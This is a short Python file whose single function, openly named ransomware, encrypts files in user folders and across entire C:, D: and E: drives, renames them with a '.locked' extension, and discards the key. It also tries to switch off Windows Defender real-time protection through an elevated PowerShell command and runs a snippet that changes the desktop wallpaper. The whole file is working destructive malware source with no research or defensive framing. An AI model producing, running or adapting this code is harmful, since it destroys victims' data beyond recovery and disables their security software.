import os
from cryptography.fernet import Fernet
import ctypes
import subprocess
def ransomware():
    key = Fernet.generate_key()
    cipher = Fernet(key)
    def encrypt_file(filepath):
        try:
            with open(filepath, 'rb') as f:
                data = f.read()
            encrypted = cipher.encrypt(data)
            with open(filepath, 'wb') as f:
                f.write(encrypted)
            os.rename(filepath, filepath + '.locked')
            return True
        except:
            return False
    def encrypt_directory(path):
        encrypted_count = 0
        for root, dirs, files in os.walk(path):
            for file in files:
                filepath = os.path.join(root, file)
                if encrypt_file(filepath):
                    encrypted_count += 1
        return encrypted_count
    try:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", "powershell", 
            "-Command Set-MpPreference -DisableRealtimeMonitoring $true", None, 1)
    except:
        pass
    targets = [
        os.path.expanduser('~/Downloads'),
        os.path.expanduser('~/Desktop'),
        'C:\\',
        'D:\\',
        'E:\\',
        os.path.expanduser('~/Documents'),
        os.path.expanduser('~/Pictures'),
        os.path.expanduser('~/Videos'),
        os.path.expanduser('~/Music')
    ]
    total_encrypted = 0
    for target in targets:
        if os.path.exists(target):
            total_encrypted += encrypt_directory(target)
    wallpaper_code = '''
    import ctypes
    SPI_SETDESKWALLPAPER = 20
    ctypes.windll.user32.SystemParametersInfoW(
        SPI_SETDESKWALLPAPER,
        0,
        "image.jpg",
        3
    )
    '''
    subprocess.run(['python', '-c', wallpaper_code])